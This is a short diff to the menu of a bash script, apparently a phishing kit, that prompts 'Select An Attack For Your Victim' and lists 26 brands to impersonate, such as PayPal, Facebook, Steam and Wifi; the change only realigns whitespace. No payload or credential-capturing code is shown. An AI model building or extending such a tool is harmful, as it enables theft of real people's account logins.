@@ -885,16 +885,16 @@ main_menu() {
 	cat <<- EOF
 		${RED}Select An Attack For Your Victim:
 
-		${WHITE}01. Airbnb		${WHITE}11. Tiktok		${WHITE}21. Roblox
-		${WHITE}02. Adobe		${WHITE}12. Snapchat	${WHITE}22. Steam	
-		${WHITE}03. Facebook	${WHITE}13. Spotify		${WHITE}23. Playstation
-		${WHITE}04. Instagram	${WHITE}14. Github		${WHITE}24. Xbox
-		${WHITE}05. Google		${WHITE}15. Shopify		${WHITE}25. Verizon
-		${WHITE}06. Bitcoin		${WHITE}16. Ebay		${WHITE}26. Wifi
-		${WHITE}07. Crypto		${WHITE}17. Pinterest		
+		${WHITE}01. Airbnb	${WHITE}11. Tiktok	${WHITE}21. Roblox
+		${WHITE}02. Adobe	${WHITE}12. Snapchat	${WHITE}22. Steam	
+		${WHITE}03. Facebook	${WHITE}13. Spotify	${WHITE}23. Playstation
+		${WHITE}04. Instagram	${WHITE}14. Github	${WHITE}24. Xbox
+		${WHITE}05. Google	${WHITE}15. Shopify	${WHITE}25. Verizon
+		${WHITE}06. Bitcoin	${WHITE}16. Ebay	${WHITE}26. Wifi
+		${WHITE}07. Crypto	${WHITE}17. Pinterest		
 		${WHITE}08. Microsoft	${WHITE}18. Discord		
-		${WHITE}09. Netflix		${WHITE}19. Reddit		
-		${WHITE}10. Paypal		${WHITE}20. Messenger		
+		${WHITE}09. Netflix	${WHITE}19. Reddit		
+		${WHITE}10. Paypal	${WHITE}20. Messenger		
 
 		${WHITE}99. About         ${WHITE}0. Exit
 	EOF
